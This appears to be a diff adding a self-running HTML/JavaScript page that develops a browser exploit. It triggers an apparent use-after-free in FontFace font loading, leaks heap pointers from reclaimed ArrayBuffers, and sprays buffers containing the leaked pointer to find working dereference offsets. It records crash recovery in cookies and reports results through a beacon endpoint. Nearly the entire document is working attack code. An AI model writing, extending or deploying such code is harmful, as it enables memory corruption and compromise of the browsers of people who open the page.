@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P710 — Automated Crash-Resilient Dereference Search</title>
+<script>
+'use strict';
+/* ============================================================
+ * P710 — Automated Crash-Resilient Secondary Dereference Search
+ *
+ * Background:
+ * - P709c & P710 Exp A proved filling ALL 24 qwords with P58 crashes.
+ * - Experiment B tests pairwise dereference: q12 = P58 + candidate = P58.
+ *
+ * Automated Architecture:
+ * - Persistent Cookie State: If a candidate causes a WebProcess crash,
+ *   the page automatically detects the crash on restart, beacons
+ *   'B-CAND-CRASH', and seamlessly advances to the next candidate.
+ * - Central CapabilityTracker: Live on-screen metrics and telemetry.
+ * ============================================================ */
+
+function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }
+
+function b(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P710-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+
+/* ---- Cookie Helpers for Crash Recovery ---- */
+function getCookie(name){
+  var match = document.cookie.match(new RegExp('(?:^|;\\s*)' + name + '=([^;]*)'));
+  return match ? decodeURIComponent(match[1]) : null;
+}
+function setCookie(name, val){
+  document.cookie = name + '=' + encodeURIComponent(val) + '; path=/; max-age=3600';
+}
+function clearCookie(name){
+  document.cookie = name + '=; path=/; max-age=0';
+}
+
+var P58 = null;
+var P68 = null;
+var B_CANDIDATES = [0, 11, 13, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23];
+var B_IDX = 0;
+
+/* ============================================================
+ * Central Capability Manager
+ * ============================================================ */
+var CapabilityTracker = {
+  state: 'INITIALIZING',
+  baseAddress: 0n,
+  secondaryAddress: 0n,
+  currentCandidate: 'none',
+  testedCount: 0,
+  crashedCount: 0,
+  survivedList: [],
+  crashedList: [],
+
+  render: function(){
+    var el = document.getElementById('out');
+    if(!el) return;
+    el.textContent = [
+      '=== P710 Automated Deref Matrix ===',
+      'State:            ' + this.state,
+      'Base (P58):       0x' + h16(this.baseAddress),
+      'Secondary (P68):  0x' + h16(this.secondaryAddress),
+      'Active Candidate: ' + this.currentCandidate,
+      'Progress:         ' + this.testedCount + ' / ' + B_CANDIDATES.length,
+      'Survived:         ' + (this.survivedList.join(', ') || 'none'),
+      'Crashed:          ' + (this.crashedList.join(', ') || 'none')
+    ].join('\n');
+  }
+};
+
+function run(){
+  b('BOOT','p710-automated-search');
+
+  /* Check if recovering from a previous candidate crash */
+  var lastCand = getCookie('p710_last_cand');
+  var savedIdx = parseInt(getCookie('p710_b_idx') || '0', 10);
+  if(isNaN(savedIdx)) savedIdx = 0;
+
+  if(lastCand){
+    b('B-CAND-CRASH', 'candidate=' + lastCand + '|advancingToIdx=' + savedIdx);
+    CapabilityTracker.crashedList.push(lastCand);
+    CapabilityTracker.crashedCount++;
+    clearCookie('p710_last_cand');
+  }
+
+  B_IDX = savedIdx;
+  CapabilityTracker.testedCount = B_IDX;
+  CapabilityTracker.render();
+
+  if(B_IDX >= B_CANDIDATES.length){
+    b('B-ALL-COMPLETE','matrix-exhausted');
+    CapabilityTracker.state = 'COMPLETED';
+    CapabilityTracker.render();
+    clearCookie('p710_b_idx');
+    return;
+  }
+
+  /* Step 1: Baseline leak for valid P58 */
+  CapabilityTracker.state = 'LEAK_PHASE';
+  CapabilityTracker.render();
+
+  doLeak(function(){
+    CapabilityTracker.baseAddress = P58;
+    CapabilityTracker.secondaryAddress = P68;
+    CapabilityTracker.state = 'TESTING_CANDIDATES';
+    CapabilityTracker.render();
+
+    /* Step 2: Run automated pairwise experiment */
+    testCandidate();
+  });
+}
+
+/* ---- Step 1: Baseline zeroed UAF to get P58/P68 ---- */
+function doLeak(cb){
+  b('LEAK-GO','round=0');
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+
+  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
+  document.fonts.add(face);
+  void face.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired) return undefined; fired=true;
+      if(st){st.remove(); st.textContent=''; st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk0');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl0, lk0','AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+
+    if(best<0 || bestNz<4){
+      b('LEAK-MISS','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    var v = new BigUint64Array(abs[best]);
+    extractPointers(v);
+
+    if(!P58){
+      b('LEAK-NOPTR','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
+    setTimeout(cb, 150);
+  }, 350);
+}
+
+function doLeakRetry(cb){
+  b('LEAK-RETRY','');
+  var st2 = document.createElement('style');
+  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
+  document.head.appendChild(st2);
+
+  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
+  document.fonts.add(face2);
+  void face2.loaded;
+
+  var abs2 = [], fired2 = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired2) return undefined; fired2=true;
+      if(st2){st2.remove(); st2.textContent=''; st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl1, lk1','CD');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs2.length;i++){
+      var u=new Uint8Array(abs2[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+    if(best<0 || bestNz<4){
+      b('LEAK-RETRY-MISS','nz='+bestNz);
+      return;
+    }
+    var v = new BigUint64Array(abs2[best]);
+    extractPointers(v);
+    if(!P58){
+      b('LEAK-RETRY-NOPTR','nz='+bestNz);
+      return;
+    }
+    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
+    setTimeout(cb, 150);
+  }, 400);
+}
+
+function extractPointers(v){
+  var LOW = BigInt('0x1000000000');
+  var HIGH = BigInt('0x80000000000');
+  for(var q=0;q<24;q++){
+    var val = v[q];
+    if(val >= LOW && val < HIGH){
+      if(!P58) P58 = val;
+      else if(!P68 && val !== P58) P68 = val;
+    }
+  }
+  if(!P68) P68 = 0n;
+}
+
+/* ============================================================
+ * Step 2: Automated Pairwise Candidate Testing
+ * ============================================================ */
+function testCandidate(){
+  if(B_IDX >= B_CANDIDATES.length){
+    b('B-DONE','all-candidates-completed');
+    CapabilityTracker.state = 'COMPLETE';
+    CapabilityTracker.render();
+    clearCookie('p710_b_idx');
+    clearCookie('p710_last_cand');
+    return;
+  }
+
+  var cand = B_CANDIDATES[B_IDX];
+  CapabilityTracker.currentCandidate = 'q' + cand + ' (idx ' + (B_IDX+1) + '/' + B_CANDIDATES.length + ')';
+  CapabilityTracker.render();
+
+  /* Record cookies BEFORE triggering: if crash occurs, next boot knows */
+  setCookie('p710_b_idx', B_IDX + 1);
+  setCookie('p710_last_cand', 'q' + cand);
+
+  b('B-PRE-TRY', 'candidate=q' + cand + '|idx=' + B_IDX + '|fill=0x' + h16(P58));
+
+  var stB = document.createElement('style');
+  stB.textContent = '@font-face{font-family:bb' + B_IDX + ';src:local(Arial);unicode-range:U+0047;}';
+  document.head.appendChild(stB);
+
+  var faceB = new FontFace('fb' + B_IDX, 'local(Helvetica)', {unicodeRange:'U+0048'});
+  document.fonts.add(faceB);
+  void faceB.loaded;
+
+  var absB = [], firedB = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if(firedB) return undefined; firedB = true;
+      if(stB){ stB.remove(); stB.textContent = ''; stB = null; }
+      try{ document.fonts.delete(this); }catch(e){}
+      document.body.offsetHeight;
+      for(var k=0; k<60; k++){
+        var ab = new ArrayBuffer(192);
+        var view = new BigUint64Array(ab);
+        view[12] = P58;    /* q12 = target dereference pointer */
+        view[cand] = P58;  /* candidate secondary pointer */
+        absB.push(ab);
+      }
+      try{ document.fonts.check('1em bb' + B_IDX); }catch(e){}
+      return undefined;
+    }, set: function(){}
+  });
+
+  document.fonts.load('1em fb' + B_IDX + ', bb' + B_IDX, 'GH');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    /* Survived! Clear the crash cookie for this candidate */
+    clearCookie('p710_last_cand');
+
+    var best = -1, bestNz = 0;
+    for(var i=0; i<absB.length; i++){
+      var u = new Uint8Array(absB[i]), nz = 0;
+      for(var j=0; j<u.length; j++) if(u[j] !== 0) nz++;
+      if(nz > bestNz){ bestNz = nz; best = i; }
+    }
+
+    if(best < 0 || bestNz < 4){
+      b('B-MISS', 'candidate=q' + cand + '|nz=' + bestNz);
+      B_IDX++;
+      setTimeout(testCandidate, 200);
+      return;
+    }
+
+    var v = new BigUint64Array(absB[best]);
+    var changed = [];
+    for(var q=0; q<24; q++){
+      var exp = (q === 12 || q === cand) ? P58 : 0n;
+      if(v[q] !== exp) changed.push('q' + q + '=0x' + h16(v[q]));
+    }
+
+    var info = 'candidate=q' + cand + '|survived=true|nz=' + bestNz + '|ch=' + (changed.join(',') || 'none');
+    b('B-SURVIVED', info);
+
+    CapabilityTracker.survivedList.push('q' + cand);
+    CapabilityTracker.testedCount = B_IDX + 1;
+    CapabilityTracker.render();
+
+    /* Advance to next candidate */
+    B_IDX++;
+    setTimeout(testCandidate, 250);
+  }, 400);
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P710 — Initializing Automated Dereference Search...</pre></body></html>
